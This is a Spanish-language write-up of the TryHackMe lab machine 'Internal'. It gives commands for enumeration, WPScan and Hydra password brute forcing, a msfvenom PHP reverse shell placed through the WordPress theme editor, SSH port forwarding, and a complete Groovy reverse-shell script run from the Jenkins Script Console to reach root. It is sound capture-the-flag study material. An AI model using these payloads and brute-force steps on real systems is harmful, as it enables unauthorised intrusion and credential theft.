---
tags:
  - Cybersecurity
  - Labs
  - TryHackMe
  - Hard
  - HTTP
  - FuzzingWeb
  - WordPress
  - CMS
  - UploadFile
  - ReverseShell
  - SSH
  - PrivilegeEscalation
  - PortForwarding
  - Hydra
---
- [[#Enumeration|Enumeration]]
	- [[#Enumeration#Ping|Ping]]
	- [[#Enumeration#Nmap|Nmap]]
	- [[#Enumeration#HTTP|HTTP]]
		- [[#HTTP#Fuzzing Web|Fuzzing Web]]
- [[#Exploitation|Exploitation]]
	- [[#Exploitation#WPScan|WPScan]]
	- [[#Exploitation#Upload Files - Reverse Shell|Upload Files - Reverse Shell]]
	- [[#Exploitation#SSH|SSH]]
	- [[#Exploitation#Privilege Escalation|Privilege Escalation]]
		- [[#Privilege Escalation#Port Forwarding|Port Forwarding]]
		- [[#Privilege Escalation#Hydra|Hydra]]
		- [[#Privilege Escalation#SSH|SSH]]

---
# Resolviendo la máquina Internal

>En esta publicación, comparto cómo resolví la máquina **Internal** de [TryHackMe](https://tryhackme.com/room/internal).

---
## Enumeration
### Ping

`ping -c 1 10.10.215.220`

![[Pasted image 20250815092419.png]]

*TTL=63/64* -> **Linux**
### Nmap

`nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.215.220 -oG allPorts`

![[Pasted image 20250815092508.png]]

`nmap -p22,80 -sCV 10.10.215.220 -oN targeted`

![[Pasted image 20250815092536.png]]
### HTTP

`http://10.10.215.220/`

![[Pasted image 20250815092636.png]]
#### Fuzzing Web

`gobuster dir -u http://10.10.215.220 -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -t 64`

![[Pasted image 20250815092725.png]]

`dirb http://10.10.215.220/`

![[Pasted image 20250815100800.png]]

Se accede al directorio `/blog`.

`http://10.10.215.220/blog/`

![[Pasted image 20250815093021.png]]

![[Pasted image 20250815093155.png]]

Se observa que no se visualiza correctamente, se añade al archivo `/etc/hosts`.

`echo "10.10.215.220 internal.thm" >> /etc/hosts`

![[Pasted image 20250815093314.png]]

Se visualiza correctamente, además de averiguar con la extensión *Wappalyzer* la versión de *WordPress 5.4.2*.

---
## Exploitation
### WPScan

`wpscan --url http://10.10.215.220/blog/ --enumerate u,vp`

![[Pasted image 20250815093650.png]]
![[Pasted image 20250815093709.png]]

Se encuentra el usuario `admin`, se procede a realizar fuerza bruta.

`wpscan --url http://10.10.215.220/blog/ --passwords /usr/share/wordlists/rockyou.txt --usernames admin`

![[Pasted image 20250815094147.png]]
![[Pasted image 20250815094306.png]]

Se encuentra la contraseña del usuario `admin`.

Se accede al panel de inicio de sesión de *WordPress* y se inicia sesión con el usuario y contraseña encontrados anteriormente.

`http://internal.thm/blog/wp-admin`

![[Pasted image 20250815094638.png]]

Se puede editar código *PHP* en el siguiente apartado: `Appearance/Theme Editor/The`.

![[Pasted image 20250815094849.png]]
### Upload Files - Reverse Shell

Se genera un *payload malicioso* para copiarlo.

`msfvenom -p php/reverse_php LHOST=10.8.184.124 LPORT=1234 -f raw > pwned.php`

Se genera una escucha por el puerto `1234` para recibir la *reverse shell*.

`vim handler`

```
use multi/handler
set PAYLOAD php/reverse_php
set LHOST 10.8.184.124
set LPORT 1234
run
```

`msfconsole -r handler.rc`

`http://internal.thm/blog/`

![[Pasted image 20250815100049.png]]

`background`

`sessions -u 1`

`sessions 2`

`sysinfo`

![[Pasted image 20250815100456.png]]

`getuid`

![[Pasted image 20250815100514.png]]

`cat /etc/passwd`

![[Pasted image 20250815100623.png]]

Se encuentra el usuario `aubreanna`.

Se intenta realizar fuerza bruta con *Hydra*, pero sin éxito.

Se procede a realizar una búsqueda de archivos.

`find / -name *.txt 2>/dev/null`

![[Pasted image 20250815101925.png]]

Se visualiza el archivo `/opt/wp-save.txt`.

![[Pasted image 20250815102100.png]]

Se encuentra la contraseña del usuario `aubreanna`.
### SSH

Se accede al servicio **SSH** con el usuario y contraseña encontrados anteriormente.

`ssh aubreanna@10.10.215.220`

![[Pasted image 20250815102302.png]]

Se encuentra en el directorio del usuario `/home/aubreanna` el archivo `jenkins.txt` y se visualiza.

`cat jenkins.txt`

![[Pasted image 20250815103457.png]]

Nos dan una pequeña pista, de por donde se puede realizar la escalada de privilegios.

### Privilege Escalation
#### Port Forwarding

Se realiza *Port Forwarding* con **SSH** para poder visualizar en la máquina local el servicio que esta corriendo de manera local en la máquina victima.

Se tiene que cerrar sesión en **SSH** o abrirse una nueva terminal.

`ssh -L 9090:localhost:8080 aubreanna@10.10.215.220`

![[Pasted image 20250815104246.png]]

`http://localhost:9090/`

![[Pasted image 20250815104320.png]]

Con *Burp Suite* se analiza la petición que se envía.

![[Pasted image 20250815114238.png]]
#### Hydra

Se procede a realizar bruta con *Hydra*.

`hydra -l admin -P /usr/share/wordlists/rockyou.txt localhost -s 9090 -f http-post-form '/j_acegi_security_check:j_username=admin&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password' -t 64`

![[Pasted image 20250815114816.png]]

Se encuentra la contraseña del usuario `admin`.

Se inicia sesión en el panel de inicio de sesión con el usuario y contraseña encontrados anteriormente.

![[Pasted image 20250815114938.png]]

Se accede a una consola de scripts en la ruta: `Manage Jenkins/Tools and Actions/Script Console`.

![[Pasted image 20250815120307.png]]

Nos ponemos en escucha por el puerto 1235.

`nc -nlvp 1235`

Se ejecuta el siguiente script:

```Java
import java.net.Socket

def ip = "IP"           // Cambia aquí por la IP de tu máquina local
def port = 1235         // Puerto donde estás escuchando

try {
    Socket socket = new Socket(ip, port)

    // Cambia a ["cmd.exe"] si usas Windows
    def cmd = ["/bin/sh"]

    def process = cmd.execute()

    def processInput = process.inputStream
    def processError = process.errorStream
    def processOutput = process.outputStream

    def socketInput = socket.inputStream
    def socketOutput = socket.outputStream

    // Enviar salida estándar del proceso al socket
    Thread.start {
        try {
            int b
            while ((b = processInput.read()) != -1) {
                socketOutput.write(b)
                socketOutput.flush()
            }
        } catch (IOException ignored) {}
    }

    // Enviar salida de error del proceso al socket
    Thread.start {
        try {
            int b
            while ((b = processError.read()) != -1) {
                socketOutput.write(b)
                socketOutput.flush()
            }
        } catch (IOException ignored) {}
    }

    // Leer del socket y enviar a la entrada estándar del proceso
    int b
    while ((b = socketInput.read()) != -1) {
        processOutput.write(b)
        processOutput.flush()
    }

    process.destroy()
    socket.close()

} catch (Exception e) {
    e.printStackTrace()
}
```

![[Pasted image 20250815120236.png]]

Se realiza el tratamiento de la terminal.

```Bash
script /dev/null -c bash
Ctrl + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

Se procede a realizar una búsqueda de archivos.

`find / -name *.txt 2>/dev/null`

![[Pasted image 20250815120732.png]]

Se visualiza el archivo `/opt/note.txt`.

![[Pasted image 20250815120845.png]]

Se encuentra la contraseña del usuario `root`.
#### SSH

Se accede al servicio **SSH** con el usuario y contraseña encontrados anteriormente.

`ssh root@10.10.215.220`

![[Pasted image 20250815121148.png]]

---